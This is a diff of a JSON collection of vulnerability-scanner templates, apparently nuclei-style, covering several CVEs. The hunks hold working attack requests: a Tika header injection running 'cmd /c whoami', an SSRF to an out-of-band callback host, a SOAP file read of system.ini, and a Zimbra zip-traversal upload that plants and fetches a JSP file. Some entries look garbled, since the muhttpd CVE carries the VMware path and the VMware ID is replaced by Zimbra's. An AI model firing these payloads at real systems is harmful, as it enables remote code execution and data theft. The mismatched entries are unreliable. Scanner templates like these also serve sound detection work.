@@ -6462,11 +6462,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "Content-type": "image/jp2",
+            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue",
-            "Content-type": "image/jp2",
-            "Connection": "close"
+            "Expect": "100-continue"
           },
           "method": "PUT",
           "path": [
@@ -9890,8 +9890,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -11733,9 +11733,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -19127,6 +19127,21 @@
       ]
     },
     {
+      "id": "CVE-2022-23348",
+      "info": {
+        "name": "BigAnt Server v5.6.06 - Improper Access control",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/Runtime/Data/ms_admin.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-23779",
       "info": {
         "name": "Zoho ManageEngine - Internal Hostname Disclosure",
@@ -19951,6 +19966,21 @@
       ]
     },
     {
+      "id": "CVE-2022-31656",
+      "info": {
+        "name": "VMware - Authentication Bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/SAAS/t/_/;/WEB-INF/web.xml"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-31793",
       "info": {
         "name": "muhttpd <= 1.1.5 - Path traversal",
@@ -19960,7 +19990,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/Solar_AiConf.php/%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+            "{{BaseURL}}/SAAS/t/_/;/WEB-INF/web.xml"
           ]
         }
       ]
@@ -19981,6 +20011,20 @@
       ]
     },
     {
+      "id": "CVE-2022-31845",
+      "info": {
+        "name": "WAVLINK WN535 G3 - Information Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 10s\nGET /live_check.shtml HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-31846",
       "info": {
         "name": "WAVLINK WN535 G3 - Information Disclosure",
@@ -19991,6 +20035,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/live_mfg.shtml"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-31847",
+      "info": {
+        "name": "WAVLINK WN579 X3 M79X3.V5030.180719 - Information Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cgi-bin/ExportAllSettings.sh"
           ]
         }
       ]
@@ -20289,16 +20348,16 @@
       ]
     },
     {
-      "id": "CVE-2022-31656",
+      "id": "CVE-2022-37042",
       "info": {
-        "name": "VMware - Authentication Bypass",
+        "name": "Zimbra Collaboration Suite - Unauthenticated RCE",
         "severity": "critical"
       },
       "requests": [
         {
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/SAAS/t/_/;/WEB-INF/web.xml"
+          "raw": [
+            "POST {{path}} HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\n\n{{hex_decode(\"504b0304140008000800000000000000000000000000000000003d0000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a73701cc8bd0ac2301000e0bd4f510285042128b8555cfc5bc4163bb4743bdb4353cf24c64bf4f145d76f55642eb2f6c158262bc569b8b4e3bc3bc0046db3dc3e443ecb45957ad8dc3fc705d4bbaeeaa3506566f19d4f90401ba7f7865082f7640660e3acbe229f11a806bec980cf882ffe59832111f29f95527a444246a9caac587f030000ffff504b0708023fdd5d8500000089000000504b0304140008000800000000000000000000000000000000003d0000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a73701cc8bd0ac2301000e0bd4f510285042128b8555cfc5bc4163bb4743bdb4353cf24c64bf4f145d76f55642eb2f6c158262bc569b8b4e3bc3bc0046db3dc3e443ecb45957ad8dc3fc705d4bbaeeaa3506566f19d4f90401ba7f7865082f7640660e3acbe229f11a806bec980cf882ffe59832111f29f95527a444246a9caac587f030000ffff504b0708023fdd5d8500000089000000504b0102140014000800080000000000023fdd5d85000000890000003d00000000000000000000000000000000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a7370504b0102140014000800080000000000023fdd5d85000000890000003d00000000000000000000000000f00000002e2e2f2e2e2f2e2e2f2e2e2f6d61696c626f78642f776562617070732f7a696d62726141646d696e2f304d567a4165367067776535676f31442e6a7370504b05060000000002000200d6000000e00100000000\")}}\n",
+            "GET /zimbraAdmin/0MVzAe6pgwe5go1D.jsp HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
